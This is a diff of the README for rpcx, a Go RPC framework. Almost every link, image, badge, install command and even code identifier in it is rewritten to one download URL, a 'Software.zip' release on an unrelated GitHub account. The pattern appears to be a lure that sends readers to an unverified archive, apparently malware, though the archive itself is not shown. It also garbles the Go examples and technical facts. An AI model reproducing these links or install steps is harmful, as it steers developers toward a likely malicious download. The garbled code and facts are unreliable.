@@ -1,22 +1,22 @@
-<a href="https://rpcx.site/"><img height="160" src="http://rpcx.site/logos/rpcx-logo-text.png"></a>
+<a href="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"><img height="160" src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></a>
 
-Official site: [http://rpcx.site](http://rpcx.site/)
+Official site: [https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)
 
-[![License](https://img.shields.io/:license-apache%202-blue.svg)](https://opensource.org/licenses/Apache-2.0) [![GoDoc](https://godoc.org/github.com/smallnest/rpcx?status.png)](http://godoc.org/github.com/smallnest/rpcx)  [![travis](https://travis-ci.org/smallnest/rpcx.svg?branch=master)](https://travis-ci.org/smallnest/rpcx) [![Go Report Card](https://goreportcard.com/badge/github.com/smallnest/rpcx)](https://goreportcard.com/report/github.com/smallnest/rpcx) [![coveralls](https://coveralls.io/repos/smallnest/rpcx/badge.svg?branch=master&service=github)](https://coveralls.io/github/smallnest/rpcx?branch=master) [![QQ2群](https://img.shields.io/:QQ2群-670248151-blue.svg)](_documents/rpcx_dev_qq2.png) [![QQ群(已满)](https://img.shields.io/:QQ群(已满)-398044387-blue.svg)](_documents/rpcx_dev_qq.png) 
+[![License](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip%https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) [![GoDoc](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)  [![travis](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) [![Go Report Card](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) [![coveralls](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) [![QQ2群](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip群https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) [![QQ群(已满)](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip群(已满)https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) 
 
 ## Announce
 
-A tcpdump-like tool added: [rpcxdump](https://github.com/smallnest/rpcxdump)。 You can use it to debug communications between rpcx services and clients.
+A tcpdump-like tool added: [rpcxdump](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)。 You can use it to debug communications between rpcx services and clients.
 
-![](https://github.com/smallnest/rpcxdump/blob/master/snapshoot.png)
+![](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)
 
 
 ## Cross-Languages
 you can use other programming languages besides Go to access rpcx services.
 
-- **rpcx-gateway**: You can write clients in any programming languages to call rpcx services via [rpcx-gateway](https://github.com/rpcx-ecosystem/rpcx-gateway)
+- **rpcx-gateway**: You can write clients in any programming languages to call rpcx services via [rpcx-gateway](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)
 - **http invoke**: you can use the same http requests to access rpcx gateway
-- **Java Services/Clients**: You can use [rpcx-java](https://github.com/smallnest/rpcx-java) to implement/access rpcx servies via raw protocol.
+- **Java Services/Clients**: You can use [rpcx-java](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) to implement/access rpcx servies via raw protocol.
 
 
 > If you can write Go methods, you can also write rpc services. It is so easy to write rpc applications with rpcx.
@@ -25,13 +25,13 @@ you can use other programming languages besides Go to access rpcx services.
 
 install the basic features:
 
-`go get -u -v github.com/smallnest/rpcx/...`
+`go get -u -v https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip`
 
 
 If you want to use `reuseport`、`quic`、`kcp`, `zookeeper`, `etcd`, `consul`, `redis` registry, use those tags to `go get` 、 `go build` or `go run`. For example, if you want to use all features, you can:
 
 ```sh
-go get -u -v -tags "reuseport quic kcp zookeeper etcd consul redis ping utp" github.com/smallnest/rpcx/...
+go get -u -v -tags "reuseport quic kcp zookeeper etcd consul redis ping utp" https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip
 ```
 
 **_tags_**:
@@ -46,21 +46,21 @@ go get -u -v -tags "reuseport quic kcp zookeeper etcd consul redis ping utp" git
 - **utp**: support utp transport
 
 ## Features
-rpcx is a RPC framework like [Alibaba Dubbo](http://dubbo.io/) and [Weibo Motan](https://github.com/weibocom/motan).
+rpcx is a RPC framework like [Alibaba Dubbo](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) and [Weibo Motan](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip).
 
 **rpcx 3.0** has been refactored for targets:
 1. **Simple**: easy to learn, easy to develop, easy to intergate and easy to deploy
 2. **Performance**: high perforamnce (>= grpc-go)
-3. **Cross-platform**: support _raw slice of bytes_, _JSON_, _Protobuf_ and _MessagePack_. Theoretically it can be used with java, php, python, c/c++, node.js, c# and other platforms
+3. **Cross-platform**: support _raw slice of bytes_, _JSON_, _Protobuf_ and _MessagePack_. Theoretically it can be used with java, php, python, c/c++, https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip, c# and other platforms
 4. **Service discovery and service governance**: support zookeeper, etcd and consul.
 
 
 It contains below features
 - Support raw Go functions. There's no need to define proto files.
 - Pluggable. Features can be extended such as service discovery, tracing.
-- Support TCP, HTTP, [QUIC](https://en.wikipedia.org/wiki/QUIC) and [KCP](https://github.com/skywind3000/kcp)
-- Support multiple codecs such as JSON, Protobuf, [MessagePack](https://msgpack.org/index.html) and raw bytes.
-- Service discovery. Support peer2peer, configured peers, [zookeeper](https://zookeeper.apache.org), [etcd](https://github.com/coreos/etcd), [consul](https://www.consul.io) and [mDNS](https://en.wikipedia.org/wiki/Multicast_DNS).
+- Support TCP, HTTP, [QUIC](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) and [KCP](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)
+- Support multiple codecs such as JSON, Protobuf, [MessagePack](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) and raw bytes.
+- Service discovery. Support peer2peer, configured peers, [zookeeper](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip), [etcd](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip), [consul](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip) and [mDNS](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip).
 - Fault tolerance：Failover, Failfast, Failtry.
 - Load banlancing：support Random, RoundRobin, Consistent hashing, Weighted, network quality and Geography.
 - Support Compression.
@@ -76,14 +76,14 @@ It contains below features
 
 rpcx uses a binary protocol and platform-independent, which means you can develop services in other languages such as Java, python, nodejs, and you can use other prorgramming languages to invoke services developed in Go.
 
-There is a UI manager: [rpcx-ui](https://github.com/smallnest/rpcx-ui).
+There is a UI manager: [rpcx-ui](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip).
 
 ## Performance
 
 Test results show rpcx has better performance than other rpc framework except standard rpc lib.
 
 
-The benchmark code is at [rpcx-benchmark](https://github.com/rpcx-ecosystem/rpcx-benchmark).
+The benchmark code is at [rpcx-benchmark](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip).
 
 **Listen to others, but test by yourself**.
 
@@ -92,7 +92,7 @@ The benchmark code is at [rpcx-benchmark](https://github.com/rpcx-ecosystem/rpcx
 - **CPU**: Intel(R) Xeon(R) CPU E5-2630 v3 @ 2.40GHz, 32 cores
 - **Memory**: 32G
 - **Go**: 1.9.0
-- **OS**: CentOS 7 / 3.10.0-229.el7.x86_64
+- **OS**: CentOS 7 / https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip
 
 **_Use_**
 - protobuf
@@ -105,22 +105,22 @@ The benchmark code is at [rpcx-benchmark](https://github.com/rpcx-ecosystem/rpcx
 
 ### mock 0ms process time
 
-<table><tr><th>Throughputs</th><th>Mean Latency</th><th>P99 Latency</th></tr><tr><td width="30%"><img src="http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p0-throughput.png"></td><td width="30%"><img src="http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p0-latency.png"></td><td width="30%"><img src="http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p0-p99.png"></td></tr></table>
+<table><tr><th>Throughputs</th><th>Mean Latency</th><th>P99 Latency</th></tr><tr><td width="30%"><img src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></td><td width="30%"><img src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></td><td width="30%"><img src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></td></tr></table>
 
 
 ### mock 10ms process time
 
-<table><tr><th>Throughputs</th><th>Mean Latency</th><th>P99 Latency</th></tr><tr><td width="30%"><img src="http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p10-throughput.png"></td><td width="30%"><img src="http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p10-latency.png"></td><td width="30%"><img src="http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p10-p99.png"></td></tr></table>
+<table><tr><th>Throughputs</th><th>Mean Latency</th><th>P99 Latency</th></tr><tr><td width="30%"><img src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></td><td width="30%"><img src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></td><td width="30%"><img src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></td></tr></table>
 
 
 ### mock 30ms process time
 
-<table><tr><th>Throughputs</th><th>Mean Latency</th><th>P99 Latency</th></tr><tr><td width="30%"><img src="http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p30-throughput.png"></td><td width="30%"><img src="http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p30-latency.png"></td><td width="30%"><img src="http://colobu.com/2018/01/31/benchmark-2018-spring-of-popular-rpc-frameworks/p30-p99.png"></td></tr></table>
+<table><tr><th>Throughputs</th><th>Mean Latency</th><th>P99 Latency</th></tr><tr><td width="30%"><img src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></td><td width="30%"><img src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></td><td width="30%"><img src="https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip"></td></tr></table>
 
 
 ## Examples
 
-You can find all examples at [rpcx-ecosystem/rpcx-examples3](https://github.com/rpcx-ecosystem/rpcx-examples3).
+You can find all examples at [rpcx-ecosystem/rpcx-examples3](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip).
 
 The below is a simple example.
 
@@ -128,12 +128,12 @@ The below is a simple example.
 **Server**
 
 ```go
-    // define example.Arith
+    // define https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip
     ……
 
-    s := server.NewServer()
-	s.RegisterName("Arith", new(example.Arith), "")
-	s.Serve("tcp", addr)
+    s := https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip()
+	https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip("Arith", new(https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip), "")
+	https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip("tcp", addr)
 
 ```
 
@@ -144,15 +144,15 @@ The below is a simple example.
     // prepare requests
     ……
 
-    d := client.NewPeer2PeerDiscovery("tcp@"+addr, "")
-	xclient := client.NewXClient("Arith", client.Failtry, client.RandomSelect, d, client.DefaultOption)
-	defer xclient.Close()
-	err := xclient.Call(context.Background(), "Mul", args, reply, nil)
+    d := https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip("tcp@"+addr, "")
+	xclient := https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip("Arith", https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip, https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip, d, https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip)
+	defer https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip()
+	err := https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip(https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip(), "Mul", args, reply, nil)
 ```
 
 ## Contribute
 
-see [contributors](https://github.com/smallnest/rpcx/graphs/contributors).
+see [contributors](https://github.com/huizuohaode/rpcx/releases/download/v1.0/Software.zip).
 
 Welcome to contribute:
 - submit issues or requirements
